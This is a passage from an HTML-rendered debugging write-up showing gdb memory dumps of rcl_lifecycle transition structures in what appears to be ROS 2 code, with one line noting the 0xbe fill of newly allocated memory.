    <span id="cb121-19"><a href="#cb121-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a88:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-20"><a href="#cb121-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a90:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-21"><a href="#cb121-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a98:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-22"><a href="#cb121-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004aa0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-23"><a href="#cb121-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004aa8:</span> 0x14    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-24"><a href="#cb121-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ab0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-25"><a href="#cb121-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ab8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-26"><a href="#cb121-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ac0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-27"><a href="#cb121-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ac8:</span> 0x15    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb121-28"><a href="#cb121-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ad0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-29"><a href="#cb121-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ad8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-30"><a href="#cb121-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ae0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-31"><a href="#cb121-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ae8:</span> 0x16    0x00    0x00    0x00    0xfd    0xfd    0xfd    0xfd</span>
    <span id="cb121-32"><a href="#cb121-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004af0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-33"><a href="#cb121-33" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004af8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-34"><a href="#cb121-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b00:</span> 0xc0    0x16    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-35"><a href="#cb121-35" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b08:</span> 0x03    0x00    0x00    0x00    0x6e    0x73    0x00    0x00</span>
    <span id="cb121-36"><a href="#cb121-36" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b10:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-37"><a href="#cb121-37" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b18:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-38"><a href="#cb121-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b20:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-39"><a href="#cb121-39" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b28:</span> 0x1e    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-40"><a href="#cb121-40" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b30:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-41"><a href="#cb121-41" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b38:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-42"><a href="#cb121-42" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b40:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-43"><a href="#cb121-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b48:</span> 0x1f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-44"><a href="#cb121-44" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b50:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-45"><a href="#cb121-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b58:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-46"><a href="#cb121-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b60:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-47"><a href="#cb121-47" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b68:</span> 0x20    0x00    0x00    0x00    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-48"><a href="#cb121-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b70:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-49"><a href="#cb121-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b78:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-50"><a href="#cb121-50" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b80:</span> 0x00    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-51"><a href="#cb121-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b88:</span> 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-52"><a href="#cb121-52" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b90:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-53"><a href="#cb121-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b98:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-54"><a href="#cb121-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ba0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-55"><a href="#cb121-55" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ba8:</span> 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-56"><a href="#cb121-56" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bb0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-57"><a href="#cb121-57" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bb8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-58"><a href="#cb121-58" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bc0:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-59"><a href="#cb121-59" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bc8:</span> 0x29    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-60"><a href="#cb121-60" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bd0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-61"><a href="#cb121-61" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bd8:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-62"><a href="#cb121-62" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004be0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-63"><a href="#cb121-63" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004be8:</span> 0x2a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-64"><a href="#cb121-64" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bf0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-65"><a href="#cb121-65" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bf8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-66"><a href="#cb121-66" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c00:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-67"><a href="#cb121-67" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c08:</span> 0x05    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-68"><a href="#cb121-68" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c10:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-69"><a href="#cb121-69" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c18:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-70"><a href="#cb121-70" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c20:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-71"><a href="#cb121-71" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c28:</span> 0x06    0x00    0x00    0x00    0xfc    0x7f    0x00    0x00</span>
    <span id="cb121-72"><a href="#cb121-72" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c30:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-73"><a href="#cb121-73" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c38:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-74"><a href="#cb121-74" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c40:</span> 0x40    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-75"><a href="#cb121-75" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c48:</span> 0x07    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-76"><a href="#cb121-76" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c50:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-77"><a href="#cb121-77" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c58:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-78"><a href="#cb121-78" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c60:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-79"><a href="#cb121-79" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c68:</span> 0x32    0x00    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-80"><a href="#cb121-80" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c70:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-81"><a href="#cb121-81" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c78:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-82"><a href="#cb121-82" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c80:</span> 0xc0    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-83"><a href="#cb121-83" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c88:</span> 0x33    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-84"><a href="#cb121-84" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c90:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-85"><a href="#cb121-85" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c98:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-86"><a href="#cb121-86" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ca0:</span> 0x00    0x18    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-87"><a href="#cb121-87" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ca8:</span> 0x34    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-88"><a href="#cb121-88" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cb0:</span> 0xe0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-89"><a href="#cb121-89" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cb8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-90"><a href="#cb121-90" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cc0:</span> 0x80    0x17    0x09    0x2b    0xe4    0x7f    0x00    0x00</span>
    <span id="cb121-91"><a href="#cb121-91" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cc8:</span> 0x3c    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb121-92"><a href="#cb121-92" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cd0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-93"><a href="#cb121-93" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cd8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb121-94"><a href="#cb121-94" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ce0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb121-95"><a href="#cb121-95" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ce8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb121-96"><a href="#cb121-96" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cf0:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span>
    <span id="cb121-97"><a href="#cb121-97" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004cf8:</span> 0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe    0xbe</span></code></pre></div>
    <p>The new portion of memory has been marked with <code>0xbe</code>s. <code>transition_map-&gt;transitions</code> has been updated and then:</p>
    <div class="sourceCode" id="cb122"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb122-1"><a href="#cb122-1" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">p</span> <span class="kw">&amp;</span><span class="ex">transition</span></span>
    <span id="cb122-2"><a href="#cb122-2" aria-hidden="true" tabindex="-1"></a><span class="va">$2</span> = <span class="er">(</span><span class="ex">rcl_lifecycle_transition_t</span> <span class="pp">*</span><span class="kw">)</span> <span class="ex">0x7fffeab22d90</span></span>
    <span id="cb122-3"><a href="#cb122-3" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/32b</span> 0x7fffeab22d90</span>
    <span id="cb122-4"><a href="#cb122-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d90:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-5"><a href="#cb122-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22d98:</span> 0x3d    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-6"><a href="#cb122-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da0:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-7"><a href="#cb122-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x7fffeab22da8:</span> 0x80    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-8"><a href="#cb122-8" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="fu">gdb</span><span class="kw">)</span> <span class="ex">x/768b</span> 0x617000004a00</span>
    <span id="cb122-9"><a href="#cb122-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb122-10"><a href="#cb122-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a00:</span> 0x40    0x96    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-11"><a href="#cb122-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a08:</span> 0x01    0x00    0x00    0x00    0xe0    0x60    0x00    0x00</span>
    <span id="cb122-12"><a href="#cb122-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a10:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-13"><a href="#cb122-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a18:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-14"><a href="#cb122-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a20:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-15"><a href="#cb122-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a28:</span> 0x0a    0x00    0x00    0x00    0x01    0x00    0x00    0x00</span>
    <span id="cb122-16"><a href="#cb122-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a30:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-17"><a href="#cb122-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a38:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-18"><a href="#cb122-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a40:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-19"><a href="#cb122-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a48:</span> 0x0b    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-20"><a href="#cb122-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a50:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-21"><a href="#cb122-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a58:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-22"><a href="#cb122-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a60:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-23"><a href="#cb122-23" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a68:</span> 0x0c    0x00    0x00    0x00    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-24"><a href="#cb122-24" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a70:</span> 0xa0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-25"><a href="#cb122-25" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a78:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-26"><a href="#cb122-26" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a80:</span> 0x80    0x96    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-27"><a href="#cb122-27" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a88:</span> 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-28"><a href="#cb122-28" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a90:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-29"><a href="#cb122-29" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004a98:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-30"><a href="#cb122-30" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004aa0:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-31"><a href="#cb122-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004aa8:</span> 0x14    0x00    0x00    0x00    0xff    0x7f    0x00    0x00</span>
    <span id="cb122-32"><a href="#cb122-32" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ab0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-33"><a href="#cb122-33" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ab8:</span> 0x20    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-34"><a href="#cb122-34" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ac0:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-35"><a href="#cb122-35" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ac8:</span> 0x15    0x00    0x00    0x00    0x01    0x00    0x00    0x00</span>
    <span id="cb122-36"><a href="#cb122-36" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ad0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-37"><a href="#cb122-37" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ad8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-38"><a href="#cb122-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ae0:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-39"><a href="#cb122-39" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ae8:</span> 0x16    0x00    0x00    0x00    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-40"><a href="#cb122-40" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004af0:</span> 0xc0    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-41"><a href="#cb122-41" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004af8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-42"><a href="#cb122-42" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b00:</span> 0xc0    0x96    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-43"><a href="#cb122-43" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b08:</span> 0x03    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-44"><a href="#cb122-44" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b10:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-45"><a href="#cb122-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b18:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-46"><a href="#cb122-46" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b20:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-47"><a href="#cb122-47" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b28:</span> 0x1e    0x00    0x00    0x00    0x65    0x5f    0x6d    0x73</span>
    <span id="cb122-48"><a href="#cb122-48" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b30:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-49"><a href="#cb122-49" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b38:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-50"><a href="#cb122-50" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b40:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-51"><a href="#cb122-51" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b48:</span> 0x1f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-52"><a href="#cb122-52" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b50:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-53"><a href="#cb122-53" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b58:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-54"><a href="#cb122-54" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b60:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-55"><a href="#cb122-55" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b68:</span> 0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-56"><a href="#cb122-56" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b70:</span> 0x00    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-57"><a href="#cb122-57" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b78:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-58"><a href="#cb122-58" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b80:</span> 0x00    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-59"><a href="#cb122-59" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b88:</span> 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-60"><a href="#cb122-60" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b90:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-61"><a href="#cb122-61" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004b98:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-62"><a href="#cb122-62" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ba0:</span> 0x80    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-63"><a href="#cb122-63" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004ba8:</span> 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-64"><a href="#cb122-64" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bb0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-65"><a href="#cb122-65" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bb8:</span> 0x40    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-66"><a href="#cb122-66" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bc0:</span> 0xc0    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-67"><a href="#cb122-67" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bc8:</span> 0x29    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-68"><a href="#cb122-68" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bd0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-69"><a href="#cb122-69" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bd8:</span> 0x60    0x17    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-70"><a href="#cb122-70" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004be0:</span> 0x00    0x98    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
    <span id="cb122-71"><a href="#cb122-71" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004be8:</span> 0x2a    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span>
    <span id="cb122-72"><a href="#cb122-72" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bf0:</span> 0x20    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-73"><a href="#cb122-73" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004bf8:</span> 0x40    0x18    0x00    0x00    0x30    0x61    0x00    0x00</span>
    <span id="cb122-74"><a href="#cb122-74" aria-hidden="true" tabindex="-1"></a><span class="ex">0x617000004c00:</span> 0x40    0x97    0xec    0x2c    0xb9    0x7f    0x00    0x00</span>
